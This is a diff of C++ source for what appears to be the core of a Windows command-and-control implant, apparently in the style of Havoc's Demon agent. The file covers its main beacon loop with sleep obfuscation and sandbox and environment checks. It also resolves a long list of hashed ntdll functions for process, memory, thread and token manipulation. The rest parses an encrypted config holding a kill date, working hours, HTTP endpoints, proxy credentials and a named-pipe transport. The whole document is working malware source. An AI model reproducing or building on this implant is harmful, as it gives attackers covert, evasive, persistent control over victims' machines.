@@ -1,48 +1,56 @@
-#include <core/include/implant.hpp>
-namespace Implant {
-    __text(F) uint8_t __config[CONFIG_SIZE] = { 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41, };
+#include <core/include/base.hpp>
+using namespace Xtea;
+using namespace Opsec;
+using namespace Parser;
+using namespace Dispatcher;
+using namespace Memory::Context;
+
+namespace Main {
+    UINT8 RDATA Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
 
     VOID MainRoutine() {
 
+        static int retry = 0;
         do {
-            Opsec::SleepObf();
-            x_assert(Opsec::RuntimeChecks());
+            if (!ObfuscateSleep(nullptr, nullptr) ||
+                !RuntimeChecks()) {
+                break;
+            }
 
-            if (!Opsec::CheckTime()) {
+            if (!CheckTime()) {
+                continue;
+            }
+            if (!Ctx->session.checkin &&
+                !Ctx->transport.outbound_queue) {
+                if (!CheckEnvironment()) {
+                    break;
+                }
+            }
+
+            if (!DispatchRoutine()) {
+                Ctx->session.retries++;
+                if (retry == Ctx->session.retries) { // retry count set by config
+                    break;
+                }
+
                 continue;
             }
 
-            if (!Ctx->session.checkin && !Ctx->transport.outbound_queue) {
-                x_assert(Opsec::CheckEnvironment());
-            }
-
-            Dispatcher::DispatchRoutine();
-
-            if (!NT_SUCCESS(ntstatus)) {
-                Ctx->session.retry++;
-
-                if (Ctx->session.retry == 3) { break; }
-                continue;
-            }
-
-            Ctx->session.retry = 0;
+            retry = 0;
         }
         while (ntstatus != ERROR_EXIT);
-
-    defer:
-        Memory::Context::ContextDestroy();
+        ContextDestroy();
     }
 
 
     BOOL ResolveApi() {
-        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
 
         bool success = true;
         OSVERSIONINFOW os_version = { };
 
-        x_assertb(Ctx->modules.kernel32 = M_PTR(KERNEL32));
-        x_assertb(Ctx->modules.kernbase = M_PTR(KERNELBASE));
-
+        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
+        x_assertb(Ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
+        x_assertb(Ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
         x_assertb(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));
 
         Ctx->session.version = WIN_VERSION_UNKNOWN;
@@ -83,51 +91,51 @@ namespace Implant {
         x_assertb(F_PTR_HMOD(Ctx->nt.NtContinue,                    Ctx->modules.ntdll, NTCONTINUE));
         x_assertb(F_PTR_HMOD(Ctx->nt.NtAlertResumeThread,           Ctx->modules.ntdll, NTALERTRESUMETHREAD));
         x_assertb(F_PTR_HMOD(Ctx->nt.NtSignalAndWaitForSingleObject, Ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory,           Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory,       Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtProtectVirtualMemory,        Ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtReadVirtualMemory,           Ctx->modules.ntdll, NTREADVIRTUALMEMORY)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtWriteVirtualMemory,          Ctx->modules.ntdll, NTWRITEVIRTUALMEMORY)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryVirtualMemory,          Ctx->modules.ntdll, NTQUERYVIRTUALMEMORY)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateSection,               Ctx->modules.ntdll, NTCREATESECTION)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtMapViewOfSection,            Ctx->modules.ntdll, NTMAPVIEWOFSECTION)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtUnmapViewOfSection,          Ctx->modules.ntdll, NTUNMAPVIEWOFSECTION)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenProcess,                 Ctx->modules.ntdll, NTOPENPROCESS)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateUserProcess,           Ctx->modules.ntdll, NTCREATEUSERPROCESS)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtTerminateProcess,            Ctx->modules.ntdll, NTTERMINATEPROCESS)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtTerminateThread,             Ctx->modules.ntdll, NTTERMINATETHREAD)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlCreateProcessParametersEx,  Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlDestroyProcessParameters,   Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenProcessToken,            Ctx->modules.ntdll, NTOPENPROCESSTOKEN)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenThreadToken,             Ctx->modules.ntdll, NTOPENTHREADTOKEN)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtDuplicateToken,              Ctx->modules.ntdll, NTDUPLICATETOKEN)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtDuplicateObject,             Ctx->modules.ntdll, NTDUPLICATEOBJECT)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryInformationToken,       Ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryInformationProcess,     Ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlCreateHeap,                 Ctx->modules.ntdll, RTLCREATEHEAP)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlAllocateHeap,               Ctx->modules.ntdll, RTLALLOCATEHEAP)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlReAllocateHeap,             Ctx->modules.ntdll, RTLREALLOCATEHEAP)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlFreeHeap,                   Ctx->modules.ntdll, RTLFREEHEAP)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlDestroyHeap,                Ctx->modules.ntdll, RTLDESTROYHEAP)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlInitUnicodeString,          Ctx->modules.ntdll, RTLINITUNICODESTRING)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateThreadEx,              Ctx->modules.ntdll, NTCREATETHREADEX)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtDeviceIoControlFile,         Ctx->modules.ntdll, NTDEVICEIOCONTROLFILE)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenFile,                    Ctx->modules.ntdll, NTOPENFILE)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenThread,                  Ctx->modules.ntdll, NTOPENTHREAD)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlRandomEx,                   Ctx->modules.ntdll, RTLRANDOMEX)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtResumeThread,                Ctx->modules.ntdll, NTRESUMETHREAD)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtGetContextThread,            Ctx->modules.ntdll, NTGETCONTEXTTHREAD)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtSetContextThread,            Ctx->modules.ntdll, NTSETCONTEXTTHREAD)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtSetInformationThread,        Ctx->modules.ntdll, NTSETINFORMATIONTHREAD)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtWaitForSingleObject,         Ctx->modules.ntdll, NTWAITFORSINGLEOBJECT)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.TpAllocWork,                   Ctx->modules.ntdll, TPALLOCWORK)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.TpPostWork,                    Ctx->modules.ntdll, TPPOSTWORK)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.TpReleaseWork,                 Ctx->modules.ntdll, TPRELEASEWORK)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtTestAlert,                   Ctx->modules.ntdll, NTTESTALERT)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtClose,                       Ctx->modules.ntdll, NTCLOSE)) ;
-        x_assertb(F_PTR_HMOD(Ctx->nt.RtlGetVersion,                 Ctx->modules.ntdll, RTLGETVERSION)) ;
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory,           Ctx->modules.ntdll, NTFREEVIRTUALMEMORY));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory,       Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtProtectVirtualMemory,        Ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtReadVirtualMemory,           Ctx->modules.ntdll, NTREADVIRTUALMEMORY));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtWriteVirtualMemory,          Ctx->modules.ntdll, NTWRITEVIRTUALMEMORY));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryVirtualMemory,          Ctx->modules.ntdll, NTQUERYVIRTUALMEMORY));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateSection,               Ctx->modules.ntdll, NTCREATESECTION));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtMapViewOfSection,            Ctx->modules.ntdll, NTMAPVIEWOFSECTION));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtUnmapViewOfSection,          Ctx->modules.ntdll, NTUNMAPVIEWOFSECTION));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenProcess,                 Ctx->modules.ntdll, NTOPENPROCESS));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateUserProcess,           Ctx->modules.ntdll, NTCREATEUSERPROCESS));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtTerminateProcess,            Ctx->modules.ntdll, NTTERMINATEPROCESS));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtTerminateThread,             Ctx->modules.ntdll, NTTERMINATETHREAD));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlCreateProcessParametersEx,  Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlDestroyProcessParameters,   Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenProcessToken,            Ctx->modules.ntdll, NTOPENPROCESSTOKEN));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenThreadToken,             Ctx->modules.ntdll, NTOPENTHREADTOKEN));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtDuplicateToken,              Ctx->modules.ntdll, NTDUPLICATETOKEN));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtDuplicateObject,             Ctx->modules.ntdll, NTDUPLICATEOBJECT));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryInformationToken,       Ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryInformationProcess,     Ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlCreateHeap,                 Ctx->modules.ntdll, RTLCREATEHEAP));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlAllocateHeap,               Ctx->modules.ntdll, RTLALLOCATEHEAP));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlReAllocateHeap,             Ctx->modules.ntdll, RTLREALLOCATEHEAP));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlFreeHeap,                   Ctx->modules.ntdll, RTLFREEHEAP));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlDestroyHeap,                Ctx->modules.ntdll, RTLDESTROYHEAP));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlInitUnicodeString,          Ctx->modules.ntdll, RTLINITUNICODESTRING));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateThreadEx,              Ctx->modules.ntdll, NTCREATETHREADEX));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtDeviceIoControlFile,         Ctx->modules.ntdll, NTDEVICEIOCONTROLFILE));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenFile,                    Ctx->modules.ntdll, NTOPENFILE));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenThread,                  Ctx->modules.ntdll, NTOPENTHREAD));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlRandomEx,                   Ctx->modules.ntdll, RTLRANDOMEX));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtResumeThread,                Ctx->modules.ntdll, NTRESUMETHREAD));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtGetContextThread,            Ctx->modules.ntdll, NTGETCONTEXTTHREAD));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtSetContextThread,            Ctx->modules.ntdll, NTSETCONTEXTTHREAD));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtSetInformationThread,        Ctx->modules.ntdll, NTSETINFORMATIONTHREAD));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtWaitForSingleObject,         Ctx->modules.ntdll, NTWAITFORSINGLEOBJECT));
+        x_assertb(F_PTR_HMOD(Ctx->nt.TpAllocWork,                   Ctx->modules.ntdll, TPALLOCWORK));
+        x_assertb(F_PTR_HMOD(Ctx->nt.TpPostWork,                    Ctx->modules.ntdll, TPPOSTWORK));
+        x_assertb(F_PTR_HMOD(Ctx->nt.TpReleaseWork,                 Ctx->modules.ntdll, TPRELEASEWORK));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtTestAlert,                   Ctx->modules.ntdll, NTTESTALERT));
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtClose,                       Ctx->modules.ntdll, NTCLOSE));
+        x_assertb(F_PTR_HMOD(Ctx->nt.RtlGetVersion,                 Ctx->modules.ntdll, RTLGETVERSION));
         x_assertb(F_PTR_HMOD(Ctx->nt.NtQuerySystemInformation,      Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));
 
         defer:
@@ -139,26 +147,35 @@ namespace Implant {
         bool success    = true;
         _parser parser  = { };
 
-        Parser::CreateParser(&parser, __config, sizeof(__config));
-        x_memset(__config, 0, sizeof(__config));
+        CreateParser(&parser, Config, sizeof(Config));
+        MemSet(Config, 0, sizeof(Config));
 
-        Parser::ParserMemcpy(&parser, &Ctx->config.key, nullptr);
-        Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
+        Ctx->session.peer_id = UnpackUint32(&parser);
+
+        ParserMemcpy(&parser, &Ctx->config.session_key, nullptr);
+        ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
+
+        Ctx->session.retries        = UnpackUint32(&parser);
+        Ctx->config.working_hours   = UnpackUint32(&parser);
+        Ctx->config.kill_date       = UnpackUint64(&parser);
+        Ctx->config.sleeptime       = UnpackUint32(&parser);
+        Ctx->config.jitter          = UnpackUint32(&parser);
 
         if (ENCRYPTED) {
-            Xtea::XteaCrypt(B_PTR(parser.buffer) + 0x12, parser.Length - 0x12, Ctx->config.key, FALSE);
+            XteaCrypt(B_PTR(parser.buffer) + 0x12, parser.Length - 0x12, Ctx->config.session_key, false);
         }
         // todo: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary
 
-        if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
-            x_assertb(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
-            x_assertb(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
-            x_assertb(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
-            x_assertb(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
-            x_assertb(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
+        if (F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA)) {
+            x_assertb(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+            x_assertb(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+            x_assertb(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+            x_assertb(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+            x_assertb(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
         }
         else {
-            success_(false);
+            success = false;
+            goto defer;
         }
 
         x_assertb(F_PTR_HMOD(Ctx->nt.SetProcessValidCallTargets,         Ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
@@ -251,13 +268,6 @@ namespace Implant {
         x_assertb(F_PTR_HMOD(Ctx->win32.FreeSid,                         Ctx->modules.advapi, FREESID));
 
         Ctx->transport.outbound_queue = nullptr;
-
-        Ctx->session.peer_id    = Parser::UnpackDword(&parser);
-        Ctx->config.sleeptime   = Parser::UnpackDword(&parser);
-        Ctx->config.jitter      = Parser::UnpackDword(&parser);
-        Ctx->config.hours       = Parser::UnpackDword(&parser);
-        Ctx->config.killdate    = Parser::UnpackDword64(&parser);
-
 #ifdef TRANSPORT_HTTP
         Ctx->transport.http = (_http_context*) x_malloc(sizeof(_http_context));
 
@@ -265,46 +275,46 @@ namespace Implant {
         Ctx->transport.http->endpoints  = nullptr;
         Ctx->transport.http->headers    = nullptr;
 
-        Parser::ParserWcscpy(&parser, &Ctx->transport.http->useragent, nullptr);
-        Parser::ParserWcscpy(&parser, &Ctx->transport.http->address, nullptr  );
-        Ctx->transport.http->port = (int) Parser::UnpackDword(&parser);
+        ParserWcscpy(&parser, &Ctx->transport.http->useragent, nullptr);
+        ParserWcscpy(&parser, &Ctx->transport.http->address, nullptr  );
+        Ctx->transport.http->port = (int) UnpackUint32(&parser);
+        ParserStrcpy(&parser, &Ctx->transport.domain, nullptr);
 
-        Ctx->transport.http->n_endpoints = Parser::UnpackDword(&parser);
+        Ctx->transport.http->n_endpoints = UnpackUint32(&parser);
         Ctx->transport.http->endpoints  = (wchar_t**) x_malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1)));
 
         for (auto i = 0; i < Ctx->transport.http->n_endpoints; i++) {
-            Parser::ParserWcscpy(&parser, &Ctx->transport.http->endpoints[i], nullptr);
+            ParserWcscpy(&parser, &Ctx->transport.http->endpoints[i], nullptr);
         }
 
         Ctx->transport.http->endpoints[Ctx->transport.http->n_endpoints] = nullptr;
-
-        Parser::ParserStrcpy(&parser, &Ctx->transport.domain, nullptr);
-        Ctx->transport.b_proxy = Parser::UnpackBool(&parser);
+        Ctx->transport.b_proxy = UnpackBool(&parser);
 
         if (Ctx->transport.b_proxy) {
             Ctx->transport.http->proxy = (_proxy*) x_malloc(sizeof(_proxy));
             Ctx->transport.http->access = INTERNET_OPEN_TYPE_PROXY;
 
-            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->address, nullptr );
-            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->username, nullptr );
-            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->password, nullptr );
+            ParserWcscpy(&parser, &Ctx->transport.http->proxy->address, nullptr );
+            ParserWcscpy(&parser, &Ctx->transport.http->proxy->username, nullptr );
+            ParserWcscpy(&parser, &Ctx->transport.http->proxy->password, nullptr );
         }
 #endif
 #ifdef TRANSPORT_PIPE
-        Parser::ParserWcscpy(&parser, &Ctx->transport.pipe_name, nullptr);
+        ParserWcscpy(&parser, &Ctx->transport.pipe_name, nullptr);
 #endif
 
     defer:
-        Parser::DestroyParser(&parser);
+        DestroyParser(&parser);
         return success;
     }
 }
 
-VOID Entrypoint(HMODULE Base) {
+using namespace Main;
+VOID Entrypoint() {
 
-    NT_ASSERT(Memory::Context::ContextInit());
-    NT_ASSERT(Implant::ResolveApi());
-    NT_ASSERT(Implant::ReadConfig());
+    if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
+        return;
+    }
 
-    Implant::MainRoutine();
+    MainRoutine();
 }
